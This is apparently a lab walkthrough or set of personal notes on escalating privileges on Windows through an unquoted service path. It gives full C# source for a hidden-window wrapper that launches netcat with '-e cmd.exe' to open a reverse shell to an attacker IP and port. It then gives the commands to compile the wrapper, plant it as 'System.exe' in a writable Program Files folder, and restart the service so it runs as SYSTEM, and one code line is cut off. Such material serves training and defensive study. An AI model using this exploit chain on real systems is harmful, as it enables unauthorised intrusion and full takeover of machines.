With the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target_

To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system)

We will use `mono` to compile.

`sudo apt install mono-devel`

---

First create a file called Wrapper.cs in a text editor


The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces" -- essentially giving us access to some basic functions (e.g. input/output). At the very top if the file, add the following lines:  
`using System;  
using System.Diagnostics;  
`  

These allow us to start new processes (i.e. execute netcat).

Next we need to initialise a namespace and class for the program:  
`namespace Wrapper{  
    class Program{  
        static void Main(){  
            //Our code will go here!  
        }  
    }  
}`  

We can now write the code that will call netcat. This goes inside the `Main()` function (replacing the `//Our code will go here!` line).

First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:  
`Process proc = new Process();  
ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");`  

_Make sure to replace the_ `nc-USERNAME.exe` _with the name of your own netcat executable, as well as slotting in your own IP and Port!_

With the objects created, we can now configure the process to not create it's own GUI Window when starting:  
`procInfo.CreateNoWindow = true;`  

Finally, we attach the `ProcessStartInfo` object to the process, and start the process!  
`proc.StartInfo = procInfo;  
proc.Start();`

End product:

```cs
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-k.exe", "10.50.101.>
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```


We now have a Wrapper.exe
Next we need to get the exe on .100, create a listener, then run Wrapper.exe

---

Unquoted service path vulnerabilities occur due to a very interesting aspect of how Windows looks for files. If a path in Windows contains spaces and is not surrounded by quotes (e.g. `C:\Directory One\Directory Two\Executable.exe` ) then Windows will look for the executable in the following order:

1.  `C:\Directory.exe`
2.  `C:\Directory One\Directory.exe`
3.  `C:\Directory One\Directory Two\Executable.exe`

What this means is that if we can create a file called `Directory.exe` in the root directory, or `C:\Directory One\`, then we can trick Windows into executing our file instead!


Let's take a look at the actual path of our vulnerable service: `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`. There are technically three places we _could_ add our program here:

-   We could put it in the root directory and call it `Program.exe`. This is _very_ unlikely to work, as the chances of having write permissions here are virtually 0.
-   We could put it in the `C:\Program Files (x86)\` directory and call it `System.exe`. Once again, this is unlikely to work because the chances of being able to write into `C:\Program Files (x86)\` are minimal.
-   We could put it in `C:\Program Files (x86)\System Explorer\` and call it `System.exe`. This one will work! Remember we checked the permissions of this directory in the last task and found that we had full access? This means that we can place our wrapper into this directory, then when the service is restarted, our wrapper will be executed giving us a shell as the local system user!

`copy %TEMP%\wrapper-USERNAME.exe "C:\Program Files (x86)\System Explorer\System.exe"`

---

Start a new nc listener

We now need to stop and start the vulnerable service

`sc stop SystemExplorerHelpService`
`sc start SystemExplorerHelpService`

We should now have root!